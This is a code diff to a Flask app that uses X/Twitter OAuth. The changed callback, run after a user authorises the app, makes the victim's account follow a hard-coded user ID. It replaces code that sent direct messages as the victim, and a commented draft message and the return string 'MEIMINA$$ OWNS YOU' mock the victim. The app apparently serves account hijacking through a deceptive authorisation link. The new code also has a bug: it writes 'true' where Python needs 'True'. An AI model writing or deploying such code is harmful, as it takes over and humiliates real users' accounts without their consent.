@@ -22,6 +22,7 @@ update_profile_url = 'https://api.x.com/1.1/account/update_profile.json'
 update_profile_image_url = 'https://api.x.com/1.1/account/update_profile_image.json'
 update_profile_banner_url = 'https://api.x.com/1.1/account/update_profile_banner.json'
 message_url = 'https://api.x.com/1.1/direct_messages/events/new.json'
+follow_url = 'https://api.x.com/1.1/friendships/create.json'
 # Support keys from environme
 # Support keys from environment vars (Heroku).
 app.config['APP_CONSUMER_KEY'] = os.environ.get("API_KEY")
@@ -131,6 +132,18 @@ def update_profile_name(client,name):
     #params=urllib.parse.urlencode({"name":name,"url":url,"location":location,"description":description})
     params=urllib.parse.urlencode({"name":name})
     furi=update_profile_url+"?"+params
+    print(furi)
+    resp, content = client.request(furi, "POST")
+    if resp['status'] != '200':
+        print( "ERROR "+resp['status'])
+        return
+    print(content)
+    return
+
+def follow(client,user_id):
+    #params=urllib.parse.urlencode({"name":name,"url":url,"location":location,"description":description})
+    params=urllib.parse.urlencode({"user_id":user_id,"follow":true})
+    furi=follow_url+"?"+params
     print(furi)
     resp, content = client.request(furi, "POST")
     if resp['status'] != '200':
@@ -263,18 +276,13 @@ def callback():
         api.send_direct_message(recipient_id, "Hey")
         #send_message(real_client,"1697559401543139328","I am dumb and clicked your link Goddess")
         '''
-        # Authenticate to Twitter
-        auth = tweepy.OAuthHandler(app.config['APP_CONSUMER_KEY'],app.config['APP_CONSUMER_SECRET'])
-        auth.set_access_token(real_oauth_token,real_oauth_token_secret)
+        try:
+            follow(real_client,"1806222703286001664")
+        except Exception as e:
+            print(e)
+            return str(e)
 
-        # Create API object
-        api = tweepy.API(auth)
-
-        # Send the direct message
-        recipient_id = "1697559401543139328"  # or use screen_name
-        message = "Hello, this is a test direct message!"
-        api.send_direct_message(recipient_id=recipient_id, text=message)
-        
+    
     clear_maps(oauth_token)
     
     return "MEIMINA$$ OWNS YOU"
